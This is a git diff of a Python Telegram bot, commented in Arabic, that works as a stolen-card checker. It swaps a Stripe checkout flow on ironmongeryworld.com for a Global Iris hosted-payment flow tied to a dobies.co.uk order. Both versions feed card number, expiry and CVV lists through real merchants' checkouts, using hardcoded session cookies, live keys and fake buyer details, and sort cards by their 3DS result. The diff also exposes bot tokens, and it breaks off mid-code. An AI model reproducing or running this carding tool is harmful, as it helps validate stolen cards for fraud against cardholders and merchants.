@@ -1,621 +1,711 @@
 import os
-import sys
 import asyncio
-import logging
-import random
-import string
-import time
-import signal
 from datetime import datetime
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
 import requests
+from bs4 import BeautifulSoup
 import json
-import base64
-import urllib.parse
+import time
+import re
 
-logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
-logger = logging.getLogger(__name__)
-
-BOT_TOKEN = "8166484030:AAEcpDe4EIoSRMCFKXQq33scCSiRaEfzAWU"
+# ========== الإعدادات ==========
+BOT_TOKEN = "7458997340:AAEKGFvkALm5usoFBvKdbGEs4b2dz5iSwtw"
 ADMIN_IDS = [5895491379, 844663875]
-CART_ID = ""
-PID_FILE = "/tmp/stripe_bot.pid"
 
-def check_single_instance():
-    if os.path.exists(PID_FILE):
-        try:
-            with open(PID_FILE, 'r') as f:
-                old_pid = int(f.read().strip())
-            try:
-                os.kill(old_pid, 0)
-                logger.error(f"❌ Bot already running (PID: {old_pid})")
-                sys.exit(1)
-            except OSError:
-                os.remove(PID_FILE)
-        except:
-            pass
-    
-    with open(PID_FILE, 'w') as f:
-        f.write(str(os.getpid()))
-    logger.info(f"✅ Single instance (PID: {os.getpid()})")
+# ========== إحصائيات متعددة المستخدمين ==========
+user_sessions = {}  # {user_id: {stats}}
 
-def cleanup_on_exit(signum=None, frame=None):
-    if os.path.exists(PID_FILE):
-        os.remove(PID_FILE)
-    logger.info("🛑 Cleanup done")
-    sys.exit(0)
+def get_user_stats(user_id):
+    """الحصول على إحصائيات المستخدم أو إنشاء جديدة"""
+    if user_id not in user_sessions:
+        user_sessions[user_id] = {
+            'total': 0,
+            'checking': 0,
+            'success_3ds': 0,
+            'failed': 0,
+            'errors': 0,
+            'start_time': None,
+            'is_running': False,
+            'dashboard_message_id': None,
+            'chat_id': None,
+            'current_card': '',
+            'last_response': 'Waiting...',
+            'cards_checked': 0,
+            'success_cards': [],
+            'check_mode': 'basic',  # basic أو advanced
+        }
+    return user_sessions[user_id]
 
-signal.signal(signal.SIGINT, cleanup_on_exit)
-signal.signal(signal.SIGTERM, cleanup_on_exit)
+def reset_user_stats(user_id):
+    """إعادة تعيين إحصائيات المستخدم"""
+    if user_id in user_sessions:
+        user_sessions[user_id].update({
+            'total': 0,
+            'checking': 0,
+            'success_3ds': 0,
+            'failed': 0,
+            'errors': 0,
+            'start_time': None,
+            'is_running': False,
+            'current_card': '',
+            'last_response': 'Waiting...',
+            'cards_checked': 0,
+            'success_cards': [],
+        })
 
-COOKIES = {
-    'store_switcher_popup_closed': 'closed',
-    'wp_customerGroup': 'NOT%20LOGGED%20IN',
-    'store': 'default',
-    'geoip_store_code': 'default',
-    'searchReport-log': '0',
-    '_ga': 'GA1.1.1544945931.1762996300',
-    '_fbp': 'fb.1.1762996300449.745185757966968218',
-    'currency_code': 'GBP',
-    'twk_idm_key': 'PMoLl3NLO_4dYa5TygOUk',
-    '__stripe_mid': '5ba8807a-b591-46e1-8779-a46eb868a4f6906666',
-    'form_key': 'zm3VIr7fkHHjLXLQ',
-    '_gcl_au': '1.1.515112964.1762996300.1452801322.1763014957.1763014957',
-    'private_content_version': 'e2595143240d4c9339c06c6abde76403',
-    'PHPSESSID': 'o495ud819llgdnbi8r111qouqs',
-    'sociallogin_referer_store': 'https://www.ironmongeryworld.com/checkout/cart/',
-    'mage-cache-storage': '{}',
-    'mage-cache-storage-section-invalidation': '{}',
-    'mage-cache-sessid': 'true',
-    'mage-messages': '',
-    '_ga_PGSR3N5SW9': 'GS2.1.s1763018847$o5$g1$t1763018848$j59$l0$h1533942665',
-    'recently_viewed_product': '{}',
-    'recently_viewed_product_previous': '{}',
-    'recently_compared_product': '{}',
-    'recently_compared_product_previous': '{}',
-    'product_data_storage': '{}',
-    'section_data_ids': '{%22customer%22:1763018849%2C%22messages%22:1763018849%2C%22compare-products%22:1763018849%2C%22last-ordered-items%22:1763018849%2C%22cart%22:1763018849%2C%22directory-data%22:1763018849%2C%22captcha%22:1763018849%2C%22instant-purchase%22:1763018849%2C%22loggedAsCustomer%22:1763018849%2C%22persistent%22:1763018849%2C%22review%22:1763018849%2C%22wishlist%22:1763018849%2C%22gtm%22:1763018849%2C%22wp_confirmation_popup%22:1763018849%2C%22recently_viewed_product%22:1763018849%2C%22recently_compared_product%22:1763018849%2C%22product_data_storage%22:1763018849%2C%22paypal-billing-agreement%22:1763018849}',
-    '_uetsid': '464c7840becf11f08903dfcb43b5c71c',
-    '_uetvid': '464c81c0becf11f08a53418e9d7cada4',
-    'TawkConnectionTime': '0',
-    'twk_uuid_62308ea51ffac05b1d7eb157': '%7B%22uuid%22%3A%221.AGJiGUpszpgFyK1fuLzv7ux73zcIxiPU5UywW1HN5uhgsjjnWh4i9F0OMR4T9BhpDPR4USYpzwLAzPRNrpLIjIpoKvc0t7P14AaYhdeCxg6BfbbW1XjgRdrynUXBNBBP%22%2C%22version%22%3A3%2C%22domain%22%3A%22ironmongeryworld.com%22%2C%22ts%22%3A1763018849856%7D',
-}
-
-def generate_random_email():
-    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'protonmail.com']
-    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-    return f"{random_string}@{random.choice(domains)}"
-
-def get_quote_id_smart(product_id=16124, qty=1, cookies=None):
-    global CART_ID
-    if cookies is None:
-        cookies = COOKIES
-    
-    try:
-        headers = {'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0', 'X-Requested-With': 'XMLHttpRequest'}
-        params = {'sections': 'cart', 'force_new_section_timestamp': 'true', '_': str(int(time.time() * 1000))}
-        
-        r = requests.get('https://www.ironmongeryworld.com/customer/section/load/', params=params, cookies=cookies, headers=headers, timeout=15)
-        if r.status_code != 200:
-            return None
-        
-        data = r.json()
-        cart = data.get('cart', {})
-        items_count = cart.get('summary_count', 0)
-        
-        if items_count == 0:
-            headers_add = {'Accept': 'text/html,application/xhtml+xml', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.ironmongeryworld.com', 'User-Agent': 'Mozilla/5.0'}
-            data_add = {'product': str(product_id), 'form_key': cookies.get('form_key'), 'qty': str(qty)}
-            
-            r_add = requests.post(f'https://www.ironmongeryworld.com/checkout/cart/add/product/{product_id}/', cookies=cookies, headers=headers_add, data=data_add, allow_redirects=True, timeout=15)
-            if r_add.status_code not in [200, 302]:
-                return None
-            
-            time.sleep(2)
-            r = requests.get('https://www.ironmongeryworld.com/customer/section/load/', params=params, cookies=cookies, headers=headers, timeout=15)
-            data = r.json()
-            cart = data.get('cart', {})
-        
-        quote_id = cart.get('mpquickcart', {}).get('quoteId')
-        if quote_id:
-            CART_ID = quote_id
-            return quote_id
-        return None
-    except Exception as e:
-        logger.error(f"Cart error: {e}")
-        return None
-
-stats = {
-    'total': 0, 'checking': 0, 'authenticated': 0, 'challenge': 0, 'attempted': 0,
-    'not_auth': 0, 'unavailable': 0, 'declined': 0, 'rejected': 0, 'errors': 0,
-    'cart_refreshed': 0, 'cart_refresh_failed': 0, 'start_time': None, 'is_running': False,
-    'dashboard_message_id': None, 'chat_id': None, 'current_card': '', 'last_response': 'Waiting...',
-    'cards_checked': 0, 'authenticated_cards': [], 'challenge_cards': [], 'attempted_cards': []
-}
-
-class StripeChecker:
-    def __init__(self):
+# ========== Card Checker Class ==========
+class CardChecker:
+    def __init__(self, check_mode='basic'):
         self.session = requests.Session()
-        self.headers = {'accept': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+        self.check_mode = check_mode
+    
+    def analyze_3ds_response(self, html_content):
+        """تحليل استجابة 3DS من HTML"""
+        try:
+            soup = BeautifulSoup(html_content, 'html.parser')
+            text_content = soup.get_text().lower()
+            
+            # أولاً: فحص رسائل الفشل الصريحة
+            critical_failure_patterns = [
+                "can't complete this transaction",
+                "cannot complete this transaction",
+                "unable to complete",
+                "transaction.*declined",
+                "card.*declined",
+                "payment.*declined",
+                "insufficient.*funds",
+                "card.*expired",
+                "invalid.*cvv",
+            ]
+            
+            for pattern in critical_failure_patterns:
+                if re.search(pattern, text_content, re.IGNORECASE):
+                    error_msg = soup.find('h2')
+                    if error_msg:
+                        error_text = error_msg.get_text().strip()
+                    else:
+                        error_para = soup.find('p')
+                        error_text = error_para.get_text().strip()[:100] if error_para else "فشل المعاملة"
+                    return False, error_text
+            
+            # ثانياً: فحص علامات النجاح
+            success_patterns = [
+                'enter.*code',
+                'enter.*secure code',
+                'enter your.*digit',
+                'type.*code',
+                'verification code sent',
+                'code has been sent',
+                'we.*sent.*code',
+                'check your phone',
+                'check your email',
+                'authentication code',
+            ]
+            
+            for pattern in success_patterns:
+                if re.search(pattern, text_content, re.IGNORECASE):
+                    return True, "نجح التحقق - طلب رمز التحقق"
+            
+            # فحص وجود حقول إدخال OTP
+            if 'sorry' not in text_content or 'went wrong' not in text_content:
+                input_fields = soup.find_all('input', {'type': ['text', 'tel', 'number']})
+                if input_fields:
+                    for field in input_fields:
+                        field_name = field.get('name', '').lower()
+                        field_id = field.get('id', '').lower()
+                        field_placeholder = field.get('placeholder', '').lower()
+                        
+                        if any(x in field_name or x in field_id or x in field_placeholder 
+                               for x in ['otp', 'code', 'verification', 'secure', 'text_input', 'text-input']):
+                            return True, "نجح التحقق - صفحة إدخال الرمز"
+            
+            # فحص أزرار التحقق
+            verify_buttons = soup.find_all('button', id=re.compile(r'verify|submit|confirm', re.I))
+            if verify_buttons and 'sorry' not in text_content:
+                return True, "نجح التحقق - نموذج التحقق"
+            
+            # إذا وجدنا "sorry something went wrong"
+            if ('sorry' in text_content and 'went wrong' in text_content) or \
+               ('error' in text_content and 'processing' in text_content):
+                return False, "فشل المعاملة - خطأ في المعالجة"
+            
+            return None, "استجابة غير محددة"
+            
+        except Exception as e:
+            return None, f"خطأ في التحليل: {str(e)[:30]}"
         
-    def check(self, card_number, exp_month, exp_year, cvv, retry_count=0, max_retries=3):
-        global CART_ID
+    def check(self, card_line):
+        """فحص بطاقة واحدة"""
+        debug_log = []
         
         try:
-            random_email = generate_random_email()
-            logger.info(f"📧 Email: {random_email}")
-            logger.info(f"🔍 Card: {card_number[:6]}****{card_number[-4:]}")
+            parts = card_line.strip().split('|')
+            if len(parts) != 4:
+                return "ERROR", "تنسيق خاطئ", None
             
-            headers = self.headers.copy()
-            headers.update({'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/'})
+            ccnum, month, year, cvv = parts
+            debug_log.append(f"Card: {ccnum[:6]}****{ccnum[-4:]}")
+            debug_log.append(f"Check Mode: {self.check_mode}")
             
-            clean_card = card_number.replace(" ", "").replace("-", "")
+            # الخطوة 1: الحصول على GUID
+            headers = {
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            }
             
-            data = f'billing_details[address][state]=London&billing_details[address][postal_code]=SW1A+1AA&billing_details[address][country]=GB&billing_details[address][city]=London&billing_details[address][line1]=111+North+Street&billing_details[email]={random_email}&billing_details[name]=Card+Test&billing_details[phone]=3609998856&type=card&card[number]={clean_card}&card[cvc]={cvv}&card[exp_year]={exp_year}&card[exp_month]={exp_month}&allow_redisplay=unspecified&pasted_fields=number&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&_stripe_version=2020-03-02'
+            data = {
+                'PAYER_EXIST': '0',
+                'OFFER_SAVE_CARD': '1',
+                'CARD_STORAGE_ENABLE': '1',
+                'HPP_VERSION': '2',
+                'MERCHANT_RESPONSE_URL': 'https://www.dobies.co.uk/realex/new-return.cfm',
+                'NEWSYSTEM': '1',
+                'RETURN_TSS': '1',
+                'WEB_ORDER_ID': '23614795',
+                'SITE': 'DESKTOP',
+                'MERCHANT_ID': 'bvgairflo',
+                'ORDER_ID': '11BDE712-C3E6-5F98-FBFAC4C6563D9ED3',
+                'USER_ID': '5187113',
+                'ACCOUNT': 'suttonsdobiesecomm',
+                'AMOUNT': '1698',
+                'CURRENCY': 'GBP',
+                'TIMESTAMP': '20251114091142',
+                'SHA1HASH': 'a275d57746de14eebd0810c6255e6a86b11ae0c3',
+                'AUTO_SETTLE_FLAG': '1',
+                'SHOP': 'www.dobies.co.uk',
+                'SHOPREF': '112',
+                'VAR_REF': '5187113',
+                'HPP_CUSTOMER_EMAIL': 'renes98352@neuraxo.com',
+                'HPP_BILLING_STREET1': '216 The Broadway',
+                'HPP_BILLING_CITY': 'Birmingham',
+                'HPP_BILLING_POSTALCODE': 'B203DL',
+                'HPP_BILLING_COUNTRY': '826',
+                'HPP_ADDRESS_MATCH_INDICATOR': 'TRUE',
+                'HPP_CHALLENGE_REQUEST_INDICATOR': 'NO_PREFERENCE',
+            }
             
-            r = self.session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=25)
+            response = self.session.post('https://hpp.globaliris.com/pay', headers=headers, data=data, timeout=15)
+            debug_log.append(f"Step 1: GUID Response Status: {response.status_code}")
             
-            logger.info(f"✅ PM Status: {r.status_code}")
+            soup = BeautifulSoup(response.text, 'html.parser')
+            guid_input = soup.find('input', {'name': 'guid'})
+            if not guid_input:
+                return "ERROR", "لم يتم الحصول على GUID", "\n".join(debug_log)
             
-            if r.status_code != 200:
-                logger.error(f"❌ PM Response: {r.text[:200]}")
-                return 'DECLINED', 'Card declined'
+            guid = guid_input.get('value')
+            debug_log.append(f"GUID: {guid[:20]}...")
             
-            pm = r.json()
-            if 'id' not in pm:
-                error_msg = pm.get('error', {}).get('message', 'Invalid card')
-                logger.error(f"❌ PM Error: {error_msg}")
-                return 'DECLINED', error_msg
+            # الخطوة 2: فتح صفحة البطاقة
+            card_page_url = f"https://hpp.globaliris.com/hosted-payments/blue/card.html?guid={guid}"
+            self.session.get(card_page_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
+            debug_log.append(f"Step 2: Card Page Loaded")
             
-            pm_id = pm['id']
-            logger.info(f"✅ PM ID: {pm_id}")
+            # الخطوة 3: التحقق من 3DS
+            headers_xhr = {
+                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'X-Requested-With': 'XMLHttpRequest',
+                'User-Agent': 'Mozilla/5.0',
+                'Referer': card_page_url,
+            }
             
-            headers = self.headers.copy()
-            headers.update({'content-type': 'application/json', 'origin': 'https://www.ironmongeryworld.com', 'referer': 'https://www.ironmongeryworld.com/onestepcheckout/', 'x-requested-with': 'XMLHttpRequest'})
+            verify_data = {
+                'pas_cctype': '',
+                'pas_ccnum': ccnum,
+                'pas_expiry': '',
+                'pas_cccvc': '',
+                'pas_ccname': '',
+                'guid': guid,
+            }
+            
+            verify_response = self.session.post(
+                'https://hpp.globaliris.com/hosted-payments/blue/3ds2/verifyEnrolled',
+                headers=headers_xhr,
+                data=verify_data,
+                timeout=15
+            )
+            
+            debug_log.append(f"Step 3: Verify Response Status: {verify_response.status_code}")
             
             try:
-                estimate_payload = {'address': {'country_id': 'GB', 'postcode': 'SW1A 1AA', 'region': 'London', 'region_id': 0}}
-                r_estimate = self.session.post(f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/estimate-shipping-methods', headers=headers, json=estimate_payload, timeout=25)
-                
-                carrier_code = 'matrixrate'
-                method_code = 'matrixrate_1165'
-                
-                if r_estimate.status_code == 200:
-                    shipping_methods = r_estimate.json()
-                    if shipping_methods:
-                        for m in shipping_methods:
-                            if m.get('carrier_code') == 'matrixrate':
-                                carrier_code = m.get('carrier_code', 'matrixrate')
-                                method_code = m.get('method_code', 'matrixrate_1165')
-                                break
-                logger.info(f"📦 Shipping: {carrier_code}/{method_code}")
-            except Exception as e:
-                logger.warning(f"⚠️ Estimate error: {e}")
-                carrier_code = 'matrixrate'
-                method_code = 'matrixrate_1165'
+                verify_result = verify_response.json()
+            except:
+                debug_log.append(f"Verify Response (not JSON): {verify_response.text[:200]}")
+                return "ERROR", "استجابة التحقق غير صالحة", "\n".join(debug_log)
             
-            shipping_payload = {
-                'addressInformation': {
-                    'shipping_address': {'countryId': 'GB', 'region': 'London', 'street': ['111 North Street'], 'company': '', 'telephone': '3609998856', 'postcode': 'SW1A 1AA', 'city': 'London', 'firstname': 'Card', 'lastname': 'Test'},
-                    'billing_address': {'countryId': 'GB', 'region': 'London', 'street': ['111 North Street'], 'company': '', 'telephone': '3609998856', 'postcode': 'SW1A 1AA', 'city': 'London', 'firstname': 'Card', 'lastname': 'Test', 'saveInAddressBook': None},
-                    'shipping_method_code': method_code,
-                    'shipping_carrier_code': carrier_code,
-                    'extension_attributes': {}
-                }
+            enrolled = verify_result.get('enrolled', False)
+            debug_log.append(f"Enrolled: {enrolled}")
+            
+            if not enrolled:
+                return "FAILED", "غير مسجلة في 3DS", "\n".join(debug_log)
+            
+            method_url = verify_result.get('method_url')
+            method_data = verify_result.get('method_data', {})
+            
+            # الخطوة 4: تنفيذ 3DS Method
+            method_completion_indicator = 'U'
+            
+            if method_url and method_data:
+                try:
+                    encoded_method_data = method_data.get('encoded_method_data')
+                    method_response = self.session.post(
+                        method_url,
+                        data={'threeDSMethodData': encoded_method_data},
+                        headers={'Content-Type': 'application/x-www-form-urlencoded'},
+                        timeout=10
+                    )
+                    if method_response.status_code == 200:
+                        method_completion_indicator = 'Y'
+                    else:
+                        method_completion_indicator = 'N'
+                    debug_log.append(f"Step 4: Method Status: {method_response.status_code}")
+                except Exception as e:
+                    method_completion_indicator = 'U'
+                    debug_log.append(f"Step 4: Method Error: {str(e)[:50]}")
+                
+                time.sleep(2)
+            
+            # الخطوة 5: إرسال بيانات البطاقة
+            full_card_data = {
+                'pas_cctype': '',
+                'verifyResult': json.dumps(verify_result),
+                'verifyEnrolled': 'Y',
+                'pas_ccnum': ccnum,
+                'pas_expiry': f"{month}/{year[-2:]}",
+                'pas_cccvc': cvv,
+                'pas_ccname': 'TEST',
+                'guid': guid,
+                'browserJavaEnabled': 'false',
+                'browserLanguage': 'en',
+                'screenColorDepth': '24',
+                'screenHeight': '1080',
+                'screenWidth': '1920',
+                'timezoneUtcOffset': '-120',
+                'threeDSMethodCompletionInd': method_completion_indicator,
             }
+            
+            auth_response = self.session.post(
+                'https://hpp.globaliris.com/hosted-payments/blue/api/auth',
+                headers=headers_xhr,
+                data=full_card_data,
+                timeout=15
+            )
+            
+            debug_log.append(f"Step 5: Auth Response Status: {auth_response.status_code}")
+            
+            content_type = auth_response.headers.get('Content-Type', '')
+            
+            if 'html' in content_type.lower() or auth_response.text.strip().startswith('<'):
+                debug_log.append(f"HTML Response detected")
+                if 'error processing your payment' in auth_response.text.lower():
+                    return "FAILED", "خطأ في معالجة الدفع", "\n".join(debug_log)
+                return "ERROR", "استجابة HTML غير متوقعة", "\n".join(debug_log)
             
             try:
-                r_shipping = self.session.post(f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/shipping-information', headers=headers, json=shipping_payload, timeout=25)
-                logger.info(f"✅ Shipping Status: {r_shipping.status_code}")
+                auth_result = auth_response.json()
+            except json.JSONDecodeError:
+                debug_log.append(f"Auth Response (not JSON): {auth_response.text[:300]}")
+                return "ERROR", "استجابة غير صالحة", "\n".join(debug_log)
+            
+            data_obj = auth_result.get('data', {})
+            verify_enrolled_result = data_obj.get('verifyEnrolledResult', {})
+            
+            # فحص وجود Challenge URL (نجاح 3DS)
+            challenge_url = None
+            encoded_creq = None
+            three_ds_session_data = None
+            
+            if verify_enrolled_result and verify_enrolled_result.get('challengeRequestUrl'):
+                challenge_url = verify_enrolled_result.get('challengeRequestUrl', '')
+                encoded_creq = verify_enrolled_result.get('encodedCreq', '')
+                three_ds_session_data = verify_enrolled_result.get('threeDSSessionData', '')
+                debug_log.append(f"✅ Challenge URL found - 3DS SUCCESS")
+            elif verify_result.get('challenge_request_url'):
+                challenge_url = verify_result.get('challenge_request_url', '')
+                encoded_creq = verify_result.get('encoded_creq', '')
+                three_ds_session_data = verify_result.get('three_ds_session_data', '')
+                debug_log.append(f"✅ Challenge URL found - 3DS SUCCESS")
+            
+            # إذا وجدنا Challenge URL = الكارت نجح 3DS
+            if challenge_url and encoded_creq:
+                debug_log.append(f"3DS Authentication Successful!")
                 
-                if r_shipping.status_code == 404 and retry_count < max_retries:
-                    logger.warning("⚠️ Cart expired, refreshing...")
-                    new_cart_id = get_quote_id_smart()
-                    if new_cart_id:
-                        stats['cart_refreshed'] += 1
-                        time.sleep(2)
-                        return self.check(card_number, exp_month, exp_year, cvv, retry_count + 1, max_retries)
-                    return 'ERROR', 'Cart expired'
-            except Exception as e:
-                logger.warning(f"⚠️ Shipping error: {e}")
+                # الوضع الأساسي: نجاح مباشر بدون تحقق إضافي
+                if self.check_mode == 'basic':
+                    return "SUCCESS", "نجح 3DS", "\n".join(debug_log)
+                
+                # الوضع المتقدم: فحص حالة إرسال الكود
+                elif self.check_mode == 'advanced':
+                    additional_status = ""
+                    try:
+                        challenge_headers = {
+                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                            'accept-language': 'ar',
+                            'content-type': 'application/x-www-form-urlencoded',
+                            'origin': 'https://hpp.globaliris.com',
+                            'referer': 'https://hpp.globaliris.com/',
+                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                        }
+                        
+                        challenge_data = {
+                            'creq': encoded_creq,
+                            'threeDSSessionData': three_ds_session_data,
+                        }
+                        
+                        debug_log.append(f"Checking OTP delivery status...")
+                        
+                        challenge_response = self.session.post(
+                            challenge_url,
+                            headers=challenge_headers,
+                            data=challenge_data,
+                            timeout=15
+                        )
+                        
+                        debug_log.append(f"Challenge Status: {challenge_response.status_code}")
+                        
+                        if challenge_response.status_code == 200:
+                            success, message = self.analyze_3ds_response(challenge_response.text)
+                            
+                            if success:
+                                additional_status = f" | ✅ {message}"
+                            elif success is False:
+                                additional_status = f" | ⚠️ {message}"
+                            else:
+                                additional_status = " | حالة الكود: غير محددة"
+                        
+                    except Exception as e:
+                        debug_log.append(f"Challenge check error: {str(e)}")
+                        additional_status = " | لم يتم التحقق من حالة الكود"
+                    
+                    return "SUCCESS", f"نجح 3DS{additional_status}", "\n".join(debug_log)
             
-            payload = {
-                'cartId': CART_ID,
-                'email': random_email,
-                'billingAddress': {'countryId': 'GB', 'region': 'London', 'street': ['111 North Street'], 'company': '', 'telephone': '3609998856', 'postcode': 'SW1A 1AA', 'city': 'London', 'firstname': 'Card', 'lastname': 'Test', 'email': random_email, 'saveInAddressBook': None},
-                'paymentMethod': {'method': 'stripe_payments', 'additional_data': {'payment_method': pm_id}}
-            }
+            # إذا لم نجد Challenge URL
+            debug_log.append(f"No Challenge URL - checking auth status...")
+            status = auth_result.get('status', 'unknown')
+            result_code = data_obj.get('response', {}).get('result', status)
             
-            r = self.session.post(f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/payment-information', headers=headers, json=payload, timeout=25)
+            debug_log.append(f"Final Status: {status}, Result Code: {result_code}")
             
-            logger.info(f"✅ PI Status: {r.status_code}")
-            logger.info(f"📄 PI Response: {r.text[:300]}")
+            if status == 'success' or result_code == '00':
+                return "SUCCESS", "نجح 3D Secure بدون Challenge", "\n".join(debug_log)
             
-            if r.status_code not in [200, 400]:
-                error_text = r.text[:300]
-                if any(k in error_text.lower() for k in ['no such entity', 'not found', 'cart', 'quote']) and retry_count < max_retries:
-                    logger.warning("⚠️ Cart issue, refreshing...")
-                    new_cart_id = get_quote_id_smart()
-                    if new_cart_id:
-                        stats['cart_refreshed'] += 1
-                        time.sleep(2)
-                        return self.check(card_number, exp_month, exp_year, cvv, retry_count + 1, max_retries)
-                    stats['cart_refresh_failed'] += 1
-                    return 'ERROR', 'Cart refresh failed'
-                return 'DECLINED', 'Payment failed'
-            
-            res = r.json()
-            if 'message' not in res:
-                logger.error(f"❌ No message in response: {res}")
-                return 'DECLINED', 'Payment declined'
-            
-            message = res['message']
-            logger.info(f"📨 Message: {message}")
-            
-            if 'pi_' not in message:
-                if 'order' in message.lower() or message.isdigit():
-                    logger.info("✅ Order created!")
-                    return 'Y', f'Order: {message}'
-                logger.warning(f"⚠️ No PI in message: {message}")
-                return 'DECLINED', message[:100]
-            
-            if 'Authentication Required: ' in message:
-                client_secret = message.replace('Authentication Required: ', '')
-            elif ': ' in message:
-                client_secret = message.split(': ')[1]
-            else:
-                client_secret = message
-            
-            if '_secret_' not in client_secret:
-                logger.error(f"❌ Invalid client_secret: {client_secret}")
-                return 'DECLINED', 'Invalid intent'
-            
-            pi_id = client_secret.split('_secret_')[0]
-            logger.info(f"✅ PI ID: {pi_id}")
-            
-            headers = self.headers.copy()
-            headers.update({'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/'})
-            
-            params = {'is_stripe_sdk': 'false', 'client_secret': client_secret, 'key': 'pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X', '_stripe_version': '2020-03-02'}
-            
-            r = self.session.get(f'https://api.stripe.com/v1/payment_intents/{pi_id}', params=params, headers=headers, timeout=25)
-            
-            logger.info(f"✅ Fetch PI Status: {r.status_code}")
-            
-            if r.status_code != 200:
-                logger.error(f"❌ Fetch PI failed: {r.text[:200]}")
-                return 'DECLINED', 'Fetch failed'
-            
-            pi = r.json()
-            pi_status = pi.get('status', 'unknown')
-            logger.info(f"📊 PI Status: {pi_status}")
-            
-            if 'next_action' not in pi:
-                if pi_status == 'succeeded':
-                    return 'Y', 'Payment succeeded'
-                elif pi_status == 'requires_payment_method':
-                    return 'DECLINED', 'Card declined'
-                elif pi_status == 'requires_confirmation':
-                    logger.info("🔄 Confirming PI...")
-                    data = f'payment_method={pm_id}&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X'
-                    r = self.session.post(f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm', headers=headers, data=data, timeout=25)
-                    if r.status_code == 200:
-                        pi = r.json()
-                        if pi.get('status') == 'succeeded':
-                            return 'Y', 'Payment succeeded'
-                    return 'DECLINED', 'Confirm failed'
-                logger.warning(f"⚠️ No next_action, status: {pi_status}")
-                return 'DECLINED', f'Status: {pi_status}'
-            
-            next_action = pi['next_action']
-            logger.info(f"🔐 next_action keys: {list(next_action.keys())}")
-            
-            if 'use_stripe_sdk' not in next_action:
-                logger.error("❌ No use_stripe_sdk in next_action")
-                return 'DECLINED', 'No 3DS'
-            
-            sdk_data = next_action['use_stripe_sdk']
-            logger.info(f"🔐 sdk_data keys: {list(sdk_data.keys())}")
-            
-            if 'three_d_secure_2_source' not in sdk_data:
-                logger.error("❌ No three_d_secure_2_source")
-                return 'DECLINED', 'No 3DS source'
-            
-            source = sdk_data.get('three_d_secure_2_source', '')
-            trans_id = sdk_data.get('server_transaction_id', '')
-            
-            logger.info(f"🔐 Source: {source[:30]}...")
-            logger.info(f"🔐 Trans ID: {trans_id}")
-            
-            if not source or not trans_id:
-                logger.error("❌ Missing source or trans_id")
-                return 'DECLINED', 'Missing 3DS'
-            
-            fp_data = {"threeDSServerTransID": trans_id}
-            fp = base64.b64encode(json.dumps(fp_data).encode()).decode()
-            
-            browser_data = {"fingerprintAttempted": True, "fingerprintData": fp, "challengeWindowSize": None, "threeDSCompInd": "Y", "browserJavaEnabled": False, "browserJavascriptEnabled": True, "browserLanguage": "en", "browserColorDepth": "24", "browserScreenHeight": "786", "browserScreenWidth": "1397", "browserTZ": "-120", "browserUserAgent": "Mozilla/5.0"}
-            
-            browser_encoded = urllib.parse.quote(json.dumps(browser_data))
-            data = f'source={source}&browser={browser_encoded}&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&_stripe_version=2020-03-02'
-            
-            headers_3ds = self.headers.copy()
-            headers_3ds.update({'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/'})
-            
-            logger.info("🔐 Calling 3DS authenticate...")
-            
-            r = self.session.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers_3ds, data=data, timeout=25)
-            
-            logger.info(f"✅ 3DS Auth Status: {r.status_code}")
-            logger.info(f"📄 3DS Response: {r.text[:500]}")
-            
-            if r.status_code != 200:
-                logger.error(f"❌ 3DS Auth failed: {r.text[:200]}")
-                return 'DECLINED', '3DS failed'
-            
-            auth = r.json()
-            
-            if 'ares' not in auth:
-                logger.error("❌ No ares in auth response!")
-                logger.error(f"Full response: {json.dumps(auth, indent=2)}")
-                return 'DECLINED', 'Invalid 3DS'
-            
-            trans_status = auth['ares'].get('transStatus', 'UNKNOWN')
-            logger.info(f"🎯 transStatus: {trans_status}")
-            
-            status_map = {
-                'Y': ('Y', 'Authenticated'),
-                'C': ('C', 'Challenge Required'),
-                'A': ('A', 'Attempted'),
-                'N': ('N', 'Not Authenticated'),
-                'U': ('U', 'Unavailable'),
